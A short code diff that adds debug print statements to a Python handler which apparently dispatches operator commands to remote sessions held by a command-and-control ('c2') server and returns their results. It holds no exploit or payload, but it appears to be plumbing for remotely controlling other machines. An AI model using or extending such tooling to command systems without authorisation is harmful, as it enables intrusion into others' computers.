@@ -57,17 +57,18 @@ def session_cmd():
 
 	# get user sessions
 	owner_sessions = c2.sessions.get(current_user.username, {})
-
+	print("Owner sessions: " + str(owner_sessions))
 	if session_uid in owner_sessions:
+		print("start")
 		session_thread = owner_sessions[session_uid]
-
+		
 		# store issued task in database
 		task = task_dao.handle_task({'task': command, 'session': session_thread.info.get('uid')})
-
+		print("Task sent: " + str(task) )
 		# send task and get response
 		session_thread.send_task(task)
 		response = session_thread.recv_task()
-
+		print("Task response received: " + str(response))
 		# update task record with result in database
 		result = task_dao.handle_task(response)
 		return str(result['result']).encode()
